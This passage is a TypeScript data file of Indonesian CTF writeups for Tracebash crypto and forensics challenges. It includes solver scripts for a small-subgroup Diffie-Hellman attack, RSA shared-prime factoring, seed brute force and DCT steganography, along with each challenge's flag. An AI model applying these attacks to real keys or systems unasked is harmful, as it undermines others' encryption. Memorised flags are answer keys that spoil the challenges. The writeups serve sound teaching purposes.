import type { WriteUp } from '../types';

// Tracebash — 23 writeups
export const tracebashWriteups: WriteUp[] = [
  {
    "id": "tracebash-crypto-brokentrustprotocol",
    "title": "Broken Trust Protocol",
    "ctfName": "Tracebash",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Broken Trust Protocol",
    "problemDescription": "",
    "tools": [],
    "analysis": "Diberikan berkas `protocol.py` network capture dan variabel numerik di `capture.txt`. Dari kode `protocol.py`, terlihat implementasi protokol Diffie-Hellman:\n\n```python\nA = pow(g,a,p)\n\nB = p-1\n\nshared = pow(B,a,p)\nkey = sha256(str(shared).encode()).digest()[:16]\n\nCelah keamanan ada pada manipulasi nilai $B$. Protokol Diffie-Hellman yang aman mengharuskan kedua belah pihak memverifikasi bahwa kunci publik pasangan berada dalam subgrup yang valid.Di sini, $B$ diatur menjadi $p - 1$. Secara modular arithmetic:$$B \\equiv -1 \\pmod p$$Ketika server menghitung shared secret:$$S = B^a \\equiv (-1)^a \\pmod p$$Nilai $S$ hanya memiliki dua kemungkinan hasil:Jika $a$ genap, $S = 1$Jika $a$ ganjil, $S = p - 1$Setelah mendapatkan shared, kunci enkripsi dibentuk melalui SHA-256 dan digunakan untuk mengenkripsi flag dengan AES-CBC:\n\nkey = sha256(str(shared).encode()).digest()[:16]\ncipher = AES.new(key,AES.MODE_CBC,iv)\n\nExploitation\nKita cukup membuat script untuk menguji kedua kemungkinan nilai shared secret (1 dan p - 1), melakukan derivasi kunci AES, dan mendekripsi ciphertext yang ada di capture.txt.\n\nBerikut script otomatis solve.py\n\nflag: TBCTF{Sm4ll_Subgr0up_Att4cks_Ar3_D34dly}",
    "solution": [
      {
        "title": "Challenge Info",
        "content": "- **CTF**: Tracebash CTF\n- **Category**: Crypto\n- **Difficulty**: Easy\n- **Points**: Unknown"
      },
      {
        "title": "TL;DR",
        "content": "Klien jahat menyuntikkan nilai $B = p - 1 \\equiv -1 \\pmod p$ pada pertukaran kunci Diffie-Hellman. Akibatnya, nilai *shared secret* ($B^a \\pmod p$) tereduksi menjadi kelompok subgrup kecil dengan hanya dua kemungkinan nilai: `1` atau `p - 1`. Kunci AES dapat didekripsi dengan melakukan brute force terhadap kedua kemungkinan ini."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "from Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\nfrom hashlib import sha256\r\n\r\n# Data dari capture.txt\r\np = 13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031\r\niv = bytes.fromhex(\"fa919bb993a1befde685c90421595e27\")\r\nciphertext = bytes.fromhex(\"534c708e7dd75a1b7ada5cb512d16bb2e8b6bf0df62b6f5e5df0e7e444fa46166426cb5a77d85b53032c3f959aeba907\")\r\n\r\n# Dua kemungkinan nilai shared secret karena B = p - 1\r\npossible_shared_secrets = [1, p - 1]\r\n\r\nprint(\"[*] Menyerang Broken Trust Protocol...\")\r\n\r\nfor shared in possible_shared_secrets:\r\n    # Rekonstruksi key menggunakan sha256 seperti pada protocol.py\r\n    key = sha256(str(shared).encode()).digest()[:16]\r\n    \r\n    try:\r\n        # Dekripsi ciphertext\r\n        cipher = AES.new(key, AES.MODE_CBC, iv)\r\n        decrypted = cipher.decrypt(ciphertext)\r\n        \r\n        # Unpad flag\r\n        flag = unpad(decrypted, 16)\r\n        \r\n        print(f\"\\n[+] Flag ditemukan (shared secret = {shared}):\")\r\n        print(flag.decode('utf-8'))\r\n        break\r\n    except (ValueError, KeyError):\r\n        # Jika padding salah, lanjut ke kemungkinan berikutnya\r\n        print(f\"[-] Shared secret {shared} salah (Padding Error).\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{Sm4ll_Subgr0up_Att4cks_Ar3_D34dly}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-crypto-harmoniccipher",
    "title": "Harmonic Cipher",
    "ctfName": "Tracebash",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "File yang dikasih cuma dua:",
    "problemDescription": "File yang dikasih cuma dua:\n\n- `melody.wav`\n- `ciphertext.bin`\n\n`ciphertext.bin` panjangnya 39 byte, jadi ini kelihatan seperti hasil XOR / stream cipher pendek, bukan blok cipher dengan padding.\n\n`melody.wav` ternyata bukan lagu penuh. Durasi total 8 detik dan tiap 1 detik berisi satu sinus murni. FFT per detik kasih delapan frekuensi ini:\n\n```text\n440, 494, 523, 587, 659, 698, 784, 880\n```\n\nItu not `A B C D E F G A`, tapi yang dipakai bukan nama notnya. Clue yang jalan justru angka frekuensinya sendiri.\n\nKalau setiap frekuensi diambil `mod 256`, key yang keluar:\n\n```text\n[184, 238, 11, 75, 147, 186, 16, 112]\n```\n\nDalam hex:\n\n```text\nb8ee0b4b93ba1070\n```\n\nXOR ciphertext dengan key itu secara repeating menghasilkan plaintext yang langsung valid:\n\n```text\nTBCTF{h4rm0n1c_fr3qu3nc13s_4r3_m3l0d1c}\n```\n\nSolver final ada di `solve.py`.\n\nRun:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport wave\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\n\r\n\r\nWAV_PATH = Path(\"melody.wav\")\r\nCIPHERTEXT_PATH = Path(\"ciphertext.bin\")\r\n\r\n\r\ndef extract_note_frequencies(path: Path) -> list[int]:\r\n    with wave.open(str(path), \"rb\") as wav_file:\r\n        sample_rate = wav_file.getframerate()\r\n        samples = np.frombuffer(\r\n            wav_file.readframes(wav_file.getnframes()), dtype=\"<i2\"\r\n        ).astype(np.float64)\r\n\r\n    seconds = len(samples) // sample_rate\r\n    frequencies = []\r\n    for second in range(seconds):\r\n        chunk = samples[second * sample_rate : (second + 1) * sample_rate]\r\n        windowed = chunk * np.hanning(len(chunk))\r\n        spectrum = np.fft.rfft(windowed)\r\n        freqs = np.fft.rfftfreq(len(windowed), d=1 / sample_rate)\r\n        spectrum[0] = 0\r\n        dominant = int(round(freqs[np.abs(spectrum).argmax()]))\r\n        frequencies.append(dominant)\r\n    return frequencies\r\n\r\n\r\ndef xor_repeating(data: bytes, key: bytes) -> bytes:\r\n    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))\r\n\r\n\r\ndef main() -> None:\r\n    ciphertext = CIPHERTEXT_PATH.read_bytes()\r\n    frequencies = extract_note_frequencies(WAV_PATH)\r\n    key = bytes(freq % 256 for freq in frequencies)\r\n    plaintext = xor_repeating(ciphertext, key)\r\n\r\n    print(\"frequencies:\", frequencies)\r\n    print(\"key_hex:\", key.hex())\r\n    print(plaintext.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{h4rm0n1c_fr3qu3nc13s_4r3_m3l0d1c}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-crypto-quantumecho",
    "title": "Quantum Echo",
    "ctfName": "Tracebash",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup CTF: Quantum Echo (Cryptography)",
    "problemDescription": "Writeup CTF: Quantum Echo (Cryptography)\n\nNama Tantangan: Quantum Echo\n\nKategori: Cryptography\n\nPoin: 100\n\nFlag: TBCTF{C0mm0n_Pr1m3s_Ar3_D34dly}\n\n1. Analisis Deskripsi & Berkas\n\nDiberikan deskripsi tantangan sebagai berikut:\n\n\"The Quantum Echo Research Facility thought their secrets were bulletproof — locked away behind the impenetrable walls of asymmetric cryptography. But somewhere in their rush to deploy, something went terribly wrong. Two keys. One message. Can you hear the echo?\"\n\nKita juga diberikan tiga buah berkas:\n\nciphertext.txt (berisi pesan terenkripsi dalam bentuk integer besar)\n\npublic1.pem (Kunci publik RSA pertama)\n\npublic2.pem (Kunci publik RSA kedua)\n\n2. Analisis Kerentanan (Vulnerability Analysis)\n\nDalam kriptografi RSA, kunci publik terdiri dari pasangan $(N, e)$, di mana $N$ adalah modulus hasil perkalian dua bilangan prima besar $p$ dan $q$ ($N = p \\times q$), sedangkan $e$ adalah eksponen enkripsi.\n\nKetika ada dua kunci publik berbeda yang dibuat secara ceroboh (misalnya menggunakan generator bilangan acak yang buruk), ada kemungkinan kedua kunci tersebut berbagi salah satu bilangan prima yang sama ($p$).\n\nJika:\n\n\n$$N_1 = p \\times q_1$$\n\n$$N_2 = p \\times q_2$$\n\nMaka kita bisa mencari faktor prima bersama tersebut dengan sangat cepat menggunakan algoritma Greatest Common Divisor (GCD) tanpa perlu melakukan faktorisasi paksa (brute-force):\n\n\n$$p = \\gcd(N_1, N_2)$$\n\nSetelah nilai $p$ ditemukan, kita bisa mencari $q_1$ atau $q_2$:\n\n\n$$q_1 = \\frac{N_1}{p}$$\n\nDengan mengetahui nilai $p$ dan $q_1$, kita dapat menghitung nilai Totient Euler $\\phi(N_1)$ dan kunci privat dekripsi $d_1$:\n\n\n$$\\phi(N_1) = (p - 1)(q_1 - 1)$$\n\n$$d_1 \\equiv e_1^{-1} \\pmod{\\phi(N_1)}$$\n\nTerakhir, kita dekripsi ciphertext $c$ untuk mendapatkan kembali pesan asli $m$:\n\n\n$$m \\equiv c^{d_1} \\pmod{N_1}$$\n\n3. Langkah Penyelesaian (Exploitation)\n\nBerikut adalah script otomatis menggunakan Python dan pustaka pycryptodome untuk mengekstrak kunci, mencari GCD, melakukan dekripsi, dan menerjemahkan hasilnya menjadi teks biasa (flag):\n\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import long_to_bytes\nimport math\n\nwith open(\"public1.pem\", \"r\") as f:\n    key1 = RSA.import_key(f.read())\n\nwith open(\"public2.pem\", \"r\") as f:\n    key2 = RSA.import_key(f.read())\n\nwith open(\"ciphertext.txt\", \"r\") as f:\n    c = int(f.read().strip().replace('%', ''))\n\nn1, e1 = key1.n, key1.e\nn2, e2 = key2.n, key2.e\n\nprint(f\"[*] N1: {n1}\\n\")\nprint(f\"[*] N2: {n2}\\n\")\n\np = math.gcd(n1, n2)\n\nif p > 1 and p != n1:\n    print(f\"[+] Ditemukan faktor prima bersama (p): {p}\\n\")\n    \n    # Hitung q untuk modulus pertama\n    q1 = n1 // p\n    \n    # Hitung phi dan private exponent (d)\n    phi1 = (p - 1) * (q1 - 1)\n    d1 = pow(e1, -1, phi1)\n    \n    # Dekripsi ciphertext\n    m = pow(c, d1, n1)\n    \n    # Konversi integer ke byte (string)\n    flag = long_to_bytes(m)\n    print(f\"[🎉] FLAG: {flag.decode(errors='ignore')}\")\nelse:\n    print(\"[-] Kedua modulus tidak berbagi faktor prima.\")\n\n\n4. Kesimpulan\n\nTantangan ini berhasil diselesaikan dengan memanfaatkan kelemahan pembuatan kunci RSA yang menghasilkan bilangan prima yang sama (Shared/Common Prime). Dengan menggunakan operasi matematika dasar GCD yang sangat cepat, kita dapat memfaktorkan modulus besar $N$ dalam hitungan milidetik dan memulihkan kunci privat untuk mendapatkan flag:\n\nFlag: TBCTF{C0mm0n_Pr1m3s_Ar3_D34dly}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "from Crypto.PublicKey import RSA\r\nfrom Crypto.Util.number import long_to_bytes\r\nimport math\r\n\r\n# 1. Load data dari file\r\nwith open(\"public1.pem\", \"r\") as f:\r\n    key1 = RSA.import_key(f.read())\r\n\r\nwith open(\"public2.pem\", \"r\") as f:\r\n    key2 = RSA.import_key(f.read())\r\n\r\nwith open(\"ciphertext.txt\", \"r\") as f:\r\n    # Membersihkan karakter '%' atau whitespace di ujung string jika ada\r\n    c = int(f.read().strip().replace('%', ''))\r\n\r\nn1, e1 = key1.n, key1.e\r\nn2, e2 = key2.n, key2.e\r\n\r\nprint(f\"[+] Key 1 Loaded: e1={e1}\")\r\nprint(f\"[+] Key 2 Loaded: e2={e2}\")\r\n\r\n# 2. Cek Kondisi 1: Common Modulus Attack (N sama, e berbeda)\r\nif n1 == n2:\r\n    print(\"[!] Mendeteksi: Common Modulus Attack!\")\r\n    n = n1\r\n    \r\n    # Algoritma Extended Euclidean untuk mencari nilai a dan b sehingga a*e1 + b*e2 = gcd(e1, e2)\r\n    def extended_gcd(a, b):\r\n        if a == 0:\r\n            return b, 0, 1\r\n        gcd, x1, y1 = extended_gcd(b % a, a)\r\n        x = y1 - (b // a) * x1\r\n        y = x1\r\n        return gcd, x, y\r\n\r\n    gcd, a, b = extended_gcd(e1, e2)\r\n    \r\n    if gcd == 1:\r\n        # Jika nilai a atau b negatif, kita gunakan modular inverse\r\n        # c^a * c^b mod n\r\n        # Jika a negatif, kita cari invers dari c mod n terlebih dahulu\r\n        if a < 0:\r\n            c1 = pow(c, -a, n)\r\n            c1 = pow(c1, -1, n)  # Invers modular\r\n        else:\r\n            c1 = pow(c, a, n)\r\n            \r\n        if b < 0:\r\n            c2 = pow(c, -b, n)\r\n            c2 = pow(c2, -1, n)  # Invers modular\r\n        else:\r\n            c2 = pow(c, b, n)\r\n            \r\n        m = (c1 * c2) % n\r\n        flag = long_to_bytes(m)\r\n        print(f\"\\n[🎉] FLAG DITEMUKAN: {flag.decode(errors='ignore')}\")\r\n    else:\r\n        print(\"[-] Gagal: GCD dari e1 dan e2 tidak bernilai 1.\")\r\n\r\n# 3. Cek Kondisi 2: Shared Prime Attack (N berbeda tapi berbagi faktor p yang sama)\r\nelse:\r\n    print(\"[*] N1 dan N2 berbeda. Mengecek shared prime (GCD)...\")\r\n    p = math.gcd(n1, n2)\r\n    \r\n    if p > 1:\r\n        print(\"[!] Mendeteksi: Shared Prime Attack (GCD Berhasil)!\")\r\n        # Mencari q untuk n1\r\n        q1 = n1 // p\r\n        phi1 = (p - 1) * (q1 - 1)\r\n        \r\n        # Mencari private key d untuk key 1\r\n        try:\r\n            d1 = pow(e1, -1, phi1)\r\n            m = pow(c, d1, n1)\r\n            flag = long_to_bytes(m)\r\n            print(f\"\\n[🎉] FLAG DITEMUKAN: {flag.decode(errors='ignore')}\")\r\n        except ValueError:\r\n            # Jika enkripsi menggunakan key 2\r\n            q2 = n2 // p\r\n            phi2 = (p - 1) * (q2 - 1)\r\n            d2 = pow(e2, -1, phi2)\r\n            m = pow(c, d2, n2)\r\n            flag = long_to_bytes(m)\r\n            print(f\"\\n[🎉] FLAG DITEMUKAN: {flag.decode(errors='ignore')}\")\r\n    else:\r\n        print(\"[-] Metode otomatis gagal. Modulus tidak sama dan tidak berbagi faktor prima.\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{C0mm0n_Pr1m3s_Ar3_D34dly}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-crypto-statedesync",
    "title": "State Desync",
    "ctfName": "Tracebash",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup: State Desync",
    "problemDescription": "Writeup: State Desync\n\nChallenge Info\n\nCTF: Tracebash CTF\n\nCategory: Crypto\n\nDifficulty: Easy\n\nPoints: Unknown\n\nTL;DR\n\nStream cipher kustom ini menggunakan dua buah seed 8-bit (seed_a dan seed_b) untuk menginisialisasi state internalnya. Karena ukuran total keyspace sangat kecil ($2^8 \\times 2^8 = 65.536$ kemungkinan), cipher ini sangat rentan terhadap serangan brute force secara penuh (exhaustive search) untuk memulihkan plaintext.\n\nAnalysis\n\nBerdasarkan berkas challenge.py, algoritma enkripsi menggunakan struktur generator stream cipher berbasis dua state internal: state_a dan state_b.\n\ndef encrypt(data, seed_a, seed_b):\n    state_a = seed_a\n    state_b = seed_b\n    ...\n\n\nMeskipun fungsi ini menerapkan mekanisme penambahan langkah pergeseran bit bitwise dinamis (irregular clocking) lewat fungsi custom_sbox dan umpan balik bit LFSR-like, seluruh kompleksitas tersebut tidak berarti karena batasan ukuran variabel seed.\n\nKedua seed diinput sebagai nilai 8-bit:\n\nRentang seed_a: $0 - 255$\n\nRentang seed_b: $0 - 255$\n\nKombinasi ruang kunci yang dihasilkan hanya sebesar $256 \\times 256 = 65.536$. Angka ini dapat diproses oleh CPU modern dalam waktu kurang dari satu detik menggunakan teknik pencarian menyeluruh (brute force). Sifat operasi XOR yang simetris memungkinkan kita mereplikasi generator keystream yang sama untuk membalikkan proses enkripsi menjadi dekripsi (byte ^ keystream_byte).\n\nExploitation\n\nEksploitasi dilakukan dengan mengiterasi seluruh kombinasi seed_a dan seed_b dari $0$ sampai $255$. Setiap hasil dekripsi teks dicocokkan dengan pola penanda flag (TBCTF{).\n\nBerikut script otomatis solve.py:\n\nimport binascii\n\ndef custom_sbox(val):\n    return ((val ^ 0x5A) + 0x33) % 256\n\ndef decrypt(ciphertext, seed_a, seed_b):\n    state_a = seed_a\n    state_b = seed_b\n    plaintext = bytearray()\n\n    for byte in ciphertext:\n        clock_steps = (state_a & 0x0F) + 1\n        for _ in range(clock_steps):\n            feedback = ((state_b >> 7) ^ (state_b >> 5) ^ (state_b >> 2) ^ (state_b >> 1)) & 1\n            state_b = ((state_b << 1) | feedback) & 0xFF\n\n        state_a = custom_sbox(state_a ^ state_b)\n        keystream_byte = custom_sbox(state_b) ^ state_a\n        plaintext.append(byte ^ keystream_byte)\n\n    return plaintext\n\nciphertext = binascii.unhexlify(\"1ad9756e666a336be1388c7d132c0a83aecfb9735366374196e187f78e38ece6\")\n\nfound = False\nfor seed_a in range(256):\n    for seed_b in range(256):\n        decrypted = decrypt(ciphertext, seed_a, seed_b)\n        if decrypted.startswith(b\"TBCTF{\"):\n            print(f\"[+] Flag: {decrypted.decode('utf-8')}\")\n            found = True\n            break\n    if found:\n        break\n\n\nJalankan script untuk merestorasi flag:\n\npython3 solve.py\n\n\nFlag: TBCTF{h1dd3n_st4t3_m4chin3_f4il}",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import binascii\r\n\r\ndef custom_sbox(val):\r\n    return ((val ^ 0x5A) + 0x33) % 256\r\n\r\ndef decrypt(ciphertext, seed_a, seed_b):\r\n    state_a = seed_a\r\n    state_b = seed_b\r\n    plaintext = bytearray()\r\n\r\n    for byte in ciphertext:\r\n        clock_steps = (state_a & 0x0F) + 1\r\n        for _ in range(clock_steps):\r\n            feedback = ((state_b >> 7) ^ (state_b >> 5) ^ (state_b >> 2) ^ (state_b >> 1)) & 1\r\n            state_b = ((state_b << 1) | feedback) & 0xFF\r\n\r\n        state_a = custom_sbox(state_a ^ state_b)\r\n\r\n        keystream_byte = custom_sbox(state_b) ^ state_a\r\n        plaintext.append(byte ^ keystream_byte)\r\n\r\n    return plaintext\r\n\r\n# Ciphertext dari deskripsi soal\r\nct_hex = \"1ad9756e666a336be1388c7d132c0a83aecfb9735366374196e187f78e38ece6\"\r\nciphertext = binascii.unhexlify(ct_hex)\r\n\r\nprint(\"[*] Memulai Brute Force 16-bit Keyspace...\")\r\n\r\n# Brute force semua kemungkinan seed_a dan seed_b (0-255)\r\nfound = False\r\nfor seed_a in range(256):\r\n    for seed_b in range(256):\r\n        decrypted = decrypt(ciphertext, seed_a, seed_b)\r\n        \r\n        # Validasi header flag yang dicari\r\n        if decrypted.startswith(b\"TBCTF{\"):\r\n            print(f\"\\n[+] Flag ditemukan!\")\r\n            print(f\"[+] Seed A: {seed_a} | Seed B: {seed_b}\")\r\n            print(f\"[+] Plaintext: {decrypted.decode('utf-8', errors='ignore')}\")\r\n            found = True\r\n            break\r\n    if found:\r\n        break"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{h1dd3n_st4t3_m4chin3_f4il}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-foren-bespokesuperblock",
    "title": "Bespoke Superblock",
    "ctfName": "Tracebash",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Flag: `TBCTF{spat1al_aware_xor_1337}`",
    "problemDescription": "Flag: `TBCTF{spat1al_aware_xor_1337}`\n\nFile yang dikasih cuma dua:\n- `challenge.img`\n- `parser.py`\n\n`file challenge.img` ngasih hasil aneh karena header depan dibikin mirip DOS boot sector. Tapi `strings` langsung bocorin petunjuk:\n\n- `NOTICE: Custom Filesystem starts at offset 0x1000. Use parser.py for recovery.`\n- `TBFS`\n\nDari sini fokus pindah ke offset `0x1000` dan isi `parser.py`.",
    "tools": [],
    "analysis": "`parser.py` nunjukin format superblock custom:\n- offset filesystem: `0x1000`\n- header 16 byte\n- format: `Magic (4s), BlockSize (H), TotalBlocks (I), FlagInode (I)`\n\nSaat dibaca, nilainya:\n- magic: `TBFS`\n- block size: `512`\n- total blocks: `8`\n- flag inode / start data: `0x1020`\n\nScript recovery di `parser.py` baca 4 byte pertama dari tiap block:\n- block 0 -> `tbct`\n- block 1 -> `f[SP`\n- block 2 -> `AT\\x11A`\n- block 3 -> `L\\x7fAW`\n- block 4 -> `ARE\\x7f`\n- block 5 -> `XOR\\x7f`\n- block 6 -> `\\x11\\x13\\x13\\x17`\n- block 7 -> `]   `\n\nKalau digabung, hasil raw:\n\n`tbctf[SPAT\\x11AL\\x7fAWARE\\x7fXOR\\x7f\\x11\\x13\\x13\\x17]   `\n\nBagian ini jelas belum final. Petunjuk di source juga bilang ada entropy tinggi dan kemungkinan ada layer encoding tambahan.\n\nKarena banyak byte kelihatan seperti karakter printable yang digeser, cara paling cepat adalah brute-force XOR 1 byte ke seluruh hasil gabungan.\n\nXOR key `0x20` langsung ngasih string valid:\n\n`TBCTF{spat1al_aware_xor_1337}`",
    "solution": [
      {
        "title": "Langkah solve",
        "content": "1. Identifikasi file dan baca string petunjuk.\n2. Buka `parser.py` untuk paham struktur data.\n3. Parse superblock di offset `0x1000`.\n4. Ambil 4 byte pertama dari masing-masing 8 block mulai `0x1020`, lompat per `512` byte.\n5. Gabungkan semua chunk.\n6. XOR hasil gabungan dengan `0x20`.\n7. Dapat flag."
      },
      {
        "title": "Command penting",
        "content": "Cek artefak:\n\n\n\nBruteforce XOR:\n\n\n\nOutput:",
        "code": "file challenge.img\nstrings -a challenge.img | head\nxxd -g 1 -s 0x1000 -l 256 challenge.img\npython3 parser.py challenge.img"
      },
      {
        "title": "Inti bug / trik challenge",
        "content": "Format file palsu di depan dipakai buat ngecoh tool biasa.\nData flag tidak disimpan kontigu. Tiap chunk disebar ke awal block berbeda.\nHasil gabungan juga masih di-XOR satu byte (`0x20`), jadi parser bawaan cuma recover data setengah jadi."
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{spat1al_aware_xor_1337}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-foren-frequencytrap",
    "title": "Frequency Trap",
    "ctfName": "Tracebash",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "- **CTF:** TraceBash CTF\n- **Category:** Forensics\n- **Difficulty:** Medium\n- **Flag:** `TBCTF{frequency_trap_successful}`",
    "problemDescription": "PNG ini tidak menyimpan flag lewat LSB atau appended data. Petunjuk metode ekstraksinya ditaruh di EXIF, sedangkan password disamarkan sebagai program Brainfuck.\n\nPayload berada di domain frekuensi: channel luminance `Y` dipecah menjadi blok `8x8`, lalu satu bit dibaca dari koefisien DCT pada posisi `(3,3)`. Bitstream yang terbentuk didekripsi memakai password `frequencypass`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Identifikasi file dan cek metadata:\n\n\n\nBagian yang relevan:\n\n\n\n`Image Description` sudah menjelaskan jalur utama:\n\n\n\n`Lens Model` hanya berisi karakter Brainfuck. Setelah dijalankan, output-nya:",
        "code": "file frequency_trap.png\nexiftool frequency_trap.png"
      },
      {
        "title": "Ekstraksi DCT",
        "content": "Gambar dikonversi dari RGB ke YCbCr. Channel `Y` dipakai karena menyimpan luminance dan menjadi channel yang disebut oleh metode pada metadata.\n\nLangkah ekstraksinya:\n\n1. Crop bagian kanan dan bawah agar ukuran habis dibagi 8.\n2. Pecah channel `Y` menjadi blok `8x8`.\n3. Hitung DCT 2D untuk setiap blok.\n4. Ambil koefisien `(3,3)`.\n5. Tanda koefisien membentuk bit: positif `1`, negatif `0`.\n6. Susun bit secara row-major dan pack MSB-first.\n7. XOR byte stream dengan password `frequencypass` secara berulang.\n8. Cari pola flag pada hasil dekripsi.\n\nSecara ringkas:\n\n\n\nSolver juga mencoba rounded parity dan beberapa variasi QIM. Fallback ini berguna jika implementasi konversi YCbCr atau pembulatan DCT berbeda antar-library.",
        "code": "bits.append(1 if dct_block[3, 3] >= 0 else 0)\nplaintext[i] = ciphertext[i] ^ password[i % len(password)]"
      },
      {
        "title": "Menjalankan Solver",
        "content": "Install dependency Python bila belum tersedia:\n\n\n\nJalankan terhadap file PNG asli:\n\n\n\nOutput:\n\n\n\nGunakan file asli berukuran `2500x1996`. Preview yang sudah di-resize akan mengubah batas blok dan koefisien DCT sehingga payload rusak.",
        "code": "python3 -m pip install pillow numpy scipy"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\n\"\"\"TraceBash CTF - Frequency Trap solver.\r\n\r\nUsage:\r\n    python3 solve.py frequency_trap.png\r\n    python3 solve.py frequency_trap.png --verbose\r\n    python3 solve.py frequency_trap.png --deep\r\n\r\nDependencies:\r\n    pip install pillow numpy scipy\r\n\r\nThe original PNG is required. A resized preview changes the 8x8 DCT blocks and\r\ncannot be decoded reliably.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport base64\r\nimport bz2\r\nimport gzip\r\nimport hashlib\r\nimport io\r\nimport json\r\nimport lzma\r\nimport random\r\nimport re\r\nimport shutil\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nimport zipfile\r\nimport zlib\r\nfrom dataclasses import dataclass\r\nfrom pathlib import Path\r\nfrom typing import Iterable, Iterator\r\n\r\nimport numpy as np\r\nfrom PIL import ExifTags, Image\r\nfrom scipy.fft import dctn\r\n\r\nFLAG_RE = re.compile(rb\"(?:TBCTF|[A-Za-z0-9_]{2,20}CTF)\\{[^}\\r\\n]{1,200}\\}\")\r\nBF_OPS = set(\"><+-.,[]\")\r\n\r\n\r\n@dataclass(frozen=True)\r\nclass Metadata:\r\n    method: str\r\n    lens_model: str\r\n\r\n\r\n@dataclass(frozen=True)\r\nclass Hit:\r\n    flag: bytes\r\n    path: str\r\n\r\n\r\ndef brainfuck(program: str) -> bytes:\r\n    code = \"\".join(ch for ch in program if ch in BF_OPS)\r\n    jumps: dict[int, int] = {}\r\n    stack: list[int] = []\r\n\r\n    for i, op in enumerate(code):\r\n        if op == \"[\":\r\n            stack.append(i)\r\n        elif op == \"]\":\r\n            if not stack:\r\n                raise ValueError(\"unmatched ']' in Brainfuck program\")\r\n            left = stack.pop()\r\n            jumps[left] = i\r\n            jumps[i] = left\r\n    if stack:\r\n        raise ValueError(\"unmatched '[' in Brainfuck program\")\r\n\r\n    tape = [0] * 30000\r\n    ptr = pc = 0\r\n    out = bytearray()\r\n\r\n    while pc < len(code):\r\n        op = code[pc]\r\n        if op == \">\":\r\n            ptr += 1\r\n            if ptr == len(tape):\r\n                tape.append(0)\r\n        elif op == \"<\":\r\n            ptr = max(0, ptr - 1)\r\n        elif op == \"+\":\r\n            tape[ptr] = (tape[ptr] + 1) & 0xFF\r\n        elif op == \"-\":\r\n            tape[ptr] = (tape[ptr] - 1) & 0xFF\r\n        elif op == \".\":\r\n            out.append(tape[ptr])\r\n        elif op == \"[\" and tape[ptr] == 0:\r\n            pc = jumps[pc]\r\n        elif op == \"]\" and tape[ptr] != 0:\r\n            pc = jumps[pc]\r\n        pc += 1\r\n\r\n    return bytes(out)\r\n\r\n\r\ndef read_metadata(path: Path) -> Metadata:\r\n    method = \"\"\r\n    lens_model = \"\"\r\n\r\n    if shutil.which(\"exiftool\"):\r\n        try:\r\n            proc = subprocess.run(\r\n                [\"exiftool\", \"-j\", str(path)],\r\n                check=True,\r\n                capture_output=True,\r\n                text=True,\r\n            )\r\n            record = json.loads(proc.stdout)[0]\r\n            method = str(record.get(\"ImageDescription\", \"\"))\r\n            lens_model = str(record.get(\"LensModel\", \"\"))\r\n        except (subprocess.SubprocessError, json.JSONDecodeError, IndexError):\r\n            pass\r\n\r\n    if not method or not lens_model:\r\n        try:\r\n            with Image.open(path) as image:\r\n                exif = image.getexif()\r\n                tags = {ExifTags.TAGS.get(tag, str(tag)): value for tag, value in exif.items()}\r\n                method = method or str(tags.get(\"ImageDescription\", \"\"))\r\n                lens_model = lens_model or str(tags.get(\"LensModel\", \"\"))\r\n        except Exception:\r\n            pass\r\n\r\n    return Metadata(method=method, lens_model=lens_model)\r\n\r\n\r\ndef luminance_variants(path: Path) -> Iterator[tuple[str, np.ndarray]]:\r\n    with Image.open(path) as image:\r\n        rgb_u8 = np.asarray(image.convert(\"RGB\"), dtype=np.uint8)\r\n        pil_y = np.asarray(image.convert(\"YCbCr\"), dtype=np.float32)[:, :, 0]\r\n\r\n    rgb = rgb_u8.astype(np.float32)\r\n    y_float = 0.299 * rgb[:, :, 0] + 0.587 * rgb[:, :, 1] + 0.114 * rgb[:, :, 2]\r\n    y_round = np.rint(y_float).clip(0, 255).astype(np.float32)\r\n\r\n    yield \"Pillow YCbCr\", pil_y\r\n    yield \"BT.601 rounded\", y_round\r\n    